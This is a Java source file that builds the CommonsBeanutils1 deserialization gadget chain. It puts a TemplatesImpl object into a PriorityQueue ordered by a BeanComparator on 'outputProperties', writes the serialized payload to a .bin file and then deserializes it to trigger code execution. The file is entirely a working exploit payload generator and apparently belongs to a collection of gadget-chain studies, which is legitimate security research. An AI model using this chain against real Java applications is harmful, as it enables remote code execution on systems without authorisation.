package CommonsBeanutils;

import java.util.PriorityQueue;
import Tools.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;

public class CommonsBeanutils1 {
    public static String fileName = "CommonsBeanutils1.bin";
    public static void main(String[] args) throws Exception {
        TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
        //Collections.reverseOrder()
        //final BeanComparator comparator = new BeanComparator(null, Collections.reverseOrder());
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");
        SerializeUtil.setFieldValue(comparator, "property", "outputProperties");
        SerializeUtil.setFieldValue(queue, "queue", new Object[]{tmpl, tmpl});
        SerializeUtil.writeObjectToFile(queue, fileName);
        SerializeUtil.readFileObject(fileName);
    }
}
